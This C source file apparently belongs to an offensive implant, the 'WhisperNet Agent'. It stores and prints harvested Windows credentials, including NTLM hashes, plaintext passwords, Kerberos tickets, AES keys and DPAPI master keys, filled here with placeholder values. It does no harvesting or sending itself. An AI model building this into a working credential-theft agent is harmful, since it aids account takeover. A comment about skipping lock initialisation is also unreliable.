/*

A credential store mechanism for the WhisperNet Agent

Access store with: 

    get_credential_store(): Returns the first item in the credential store linked list. 


Other funcs:

    add_credential(): Add credential entry
    display_credentials(): Prints out all creds


Note: *should* be thread safe.

*/








#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


// Windows Critical Section for thread safety
static CRITICAL_SECTION cred_lock;

// Credential structure
typedef struct UserCredential {
    char *username;
    char *domain;
    char *ntlm_hash;
    char *lm_hash;
    char *plaintext_pass;
    char *kerb_ticket;
    char *aes128_key;
    char *aes256_key;
    char *dpapi_masterkey;
    struct UserCredential *next;
} UserCredential;

// Credential store (Singleton)
typedef struct {
    UserCredential *head;
    int count;
} CredentialStore;

// Singleton getter for credential store
CredentialStore *get_credential_store() {
    static CredentialStore *store = NULL;

    if (store == NULL) {
        EnterCriticalSection(&cred_lock);  // Lock before checking/modifying
        if (store == NULL) {  // Double-check to prevent race conditions
            store = malloc(sizeof(CredentialStore));
            store->head = NULL;
            store->count = 0;
        }
        LeaveCriticalSection(&cred_lock);  // Unlock after initializing
    }

    return store;
}

// Add a credential to the store
void add_credential(const char *username, const char *domain,
                    const char *ntlm_hash, const char *lm_hash, const char *plaintext_pass,
                    const char *kerb_ticket, const char *aes128_key, const char *aes256_key,
                    const char *dpapi_masterkey) {

    EnterCriticalSection(&cred_lock);  // Lock before modifying

    CredentialStore *store = get_credential_store();
    
    UserCredential *new_cred = malloc(sizeof(UserCredential));
    new_cred->username = _strdup(username);
    new_cred->domain = _strdup(domain);
    new_cred->ntlm_hash = _strdup(ntlm_hash);
    new_cred->lm_hash = lm_hash ? _strdup(lm_hash) : NULL;
    new_cred->plaintext_pass = plaintext_pass ? _strdup(plaintext_pass) : NULL;
    new_cred->kerb_ticket = kerb_ticket ? _strdup(kerb_ticket) : NULL;
    new_cred->aes128_key = aes128_key ? _strdup(aes128_key) : NULL;
    new_cred->aes256_key = aes256_key ? _strdup(aes256_key) : NULL;
    new_cred->dpapi_masterkey = dpapi_masterkey ? _strdup(dpapi_masterkey) : NULL;
    new_cred->next = store->head;

    store->head = new_cred;
    store->count++;

    LeaveCriticalSection(&cred_lock);  // Unlock after modifying
}

// Display all stored credentials
void display_credentials() {
    EnterCriticalSection(&cred_lock);  // Lock to prevent modification during read

    CredentialStore *store = get_credential_store();
    UserCredential *current = store->head;
    
    printf("\n=== Stored Credentials ===\n");
    if (!current) {
        printf("No credentials stored.\n");
    }

    while (current) {
        printf("Username: %s\n", current->username);
        printf("Domain: %s\n", current->domain);
        printf("NTLM Hash: %s\n", current->ntlm_hash);
        if (current->lm_hash) printf("LM Hash: %s\n", current->lm_hash);
        if (current->plaintext_pass) printf("Plaintext Password: %s\n", current->plaintext_pass);
        if (current->kerb_ticket) printf("Kerberos Ticket: %s\n", current->kerb_ticket);
        if (current->aes128_key) printf("AES128 Key: %s\n", current->aes128_key);
        if (current->aes256_key) printf("AES256 Key: %s\n", current->aes256_key);
        if (current->dpapi_masterkey) printf("DPAPI Master Key: %s\n", current->dpapi_masterkey);
        printf("--------------------------------\n");

        current = current->next;
    }

    LeaveCriticalSection(&cred_lock);  // Unlock after reading
}

// Free all stored credentials
void free_store() {
    EnterCriticalSection(&cred_lock);  // Lock before modifying

    CredentialStore *store = get_credential_store();
    UserCredential *current = store->head;
    
    while (current) {
        UserCredential *next = current->next;
        free(current->username);
        free(current->domain);
        free(current->ntlm_hash);
        free(current->lm_hash);
        free(current->plaintext_pass);
        free(current->kerb_ticket);
        free(current->aes128_key);
        free(current->aes256_key);
        free(current->dpapi_masterkey);
        free(current);
        current = next;
    }
    
    free(store);

    LeaveCriticalSection(&cred_lock);  // Unlock after freeing
}

// Thread function (Windows thread format)
DWORD WINAPI thread_task(LPVOID arg) {
    add_credential("admin", "CORP", 
                   "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
                   "base64-KerbTGT", "aes128-key", "aes256-key",
                   "dpapi-master-key");

    return 0;
}


int main() {

    //Note, don't *need* to do threading with InitializeCriticalSection, works fine without it, but is important to have
    // just incase the threads get weird. 

    InitializeCriticalSection(&cred_lock);  // Initialize mutex


    add_credential("admin", "CORP", 
                   "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
                   "base64-KerbTGT", "aes128-key", "aes256-key",
                   "dpapi-master-key");

    add_credential("user1", "WORKGROUP", 
                   "aad3b435b51404eeaad3b435b51404ee", NULL, NULL,
                   NULL, NULL, NULL, NULL);

    display_credentials();
    free_store();

    return 0;
}

//example thread stuff
// int main() {
//     printf("start");
//     fflush(stdout);
//     InitializeCriticalSection(&cred_lock);  // Initialize mutex

//     HANDLE thread1, thread2;

//     // Create threads using Windows API
//     thread1 = CreateThread(NULL, 0, thread_task, NULL, 0, NULL);
//     thread2 = CreateThread(NULL, 0, thread_task, NULL, 0, NULL);

//     // Wait for threads to complete before displaying results
//     WaitForSingleObject(thread1, INFINITE);
//     WaitForSingleObject(thread2, INFINITE);

//     // Cleanup
//     CloseHandle(thread1);
//     CloseHandle(thread2);

//     // Display credentials AFTER both threads have finished adding credentials
//     display_credentials();
    
//     free_store();
    
//     DeleteCriticalSection(&cred_lock);  // Destroy mutex

//     printf("end");

//     return 0;
// }
